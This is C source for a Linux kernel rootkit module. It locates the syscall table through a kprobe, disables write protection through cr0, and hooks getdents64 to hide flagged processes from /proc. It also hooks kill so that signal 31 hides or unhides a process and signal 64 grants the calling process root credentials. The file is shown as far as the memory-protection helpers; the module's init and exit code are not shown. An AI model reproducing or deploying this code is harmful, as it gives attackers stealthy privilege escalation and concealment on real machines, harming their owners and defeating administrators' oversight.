#include <linux/syscalls.h>     
#include <linux/slab.h>         
#include <linux/sched.h>        
#include <linux/fdtable.h>      
#include <linux/proc_ns.h>	
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <asm/ptrace.h>		

struct linux_dirent {
        unsigned long   d_ino;		
        unsigned long   d_off;		
        unsigned short  d_reclen;	
        char            d_name[1];	
};

#define PF_INVISIBLE 0x10000000

#define HIDE_UNHIDE_PROCESS 31
#define GET_ROOT 64

unsigned long cr0;

static unsigned long *__sys_call_table;

typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);

static tt_syscall orig_getdents64;
static tt_syscall orig_kill;

static struct kprobe kp = {
            .symbol_name = "kallsyms_lookup_name"
};

unsigned long *get_syscall_table(void)
{
	unsigned long *syscall_table;

	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);

	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
}

struct task_struct *find_task(pid_t pid)
{
	struct task_struct *target_process = current;

	for_each_process(target_process)
	{
		if (target_process->pid == pid)
		{
			return target_process;
		}
	}
	return NULL;
}

static int is_invisible(pid_t pid)
{
	struct task_struct *task;

	if (!pid)
	{
		return 0;
	}

	task = find_task(pid);
	if (!task)
	{
		return 0;
	}
	if (task->flags & PF_INVISIBLE)
	{
		return 1;
	}
	return 0;
}

static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
{
	int fd = (int) pt_regs->di;

	struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;

	int ret = orig_getdents64(pt_regs), err;

	unsigned short proc = 0;
	unsigned long offset = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;

	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);

	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		proc = 1;

	while (offset < ret)
	{
		dir = (void *)kdirent + offset;

		if ((proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
		{
			if (dir == kdirent)
			{
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		}
		else
		{
			prev = dir;
		}
		offset += dir->d_reclen;
	}
	
	err = copy_to_user(dirent, kdirent, ret);
	
	if (err)
	{
		goto out;
	}

out:
	kfree(kdirent);
	return ret;
}

static void set_root(void)
{
	struct cred *root = prepare_creds();

	if (root == NULL)
	{
		return;
	}

	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;

	commit_creds(root);
}

static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;

	struct task_struct *task;
	switch (sig)
	{
		case HIDE_UNHIDE_PROCESS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;

			task->flags = task->flags ^ PF_INVISIBLE;
			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding/unhiding pid: %d \n", pid);
			break;
		case GET_ROOT:
			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ offering root shell!!\n");

			set_root();
			break;
		default:
			return orig_kill(pt_regs);
	}
	return 0;
}


static inline void write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;
	
	asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void)
{
	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ (memory protected): Regainig normal memory protection\n");
	write_cr0_forced(cr0);
}

static inline void unprotect_memory(void)
{
	pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ (memory unprotected): Ready for editing Syscall Table");
	write_cr0_forced(cr0 & ~0x00010000);
}

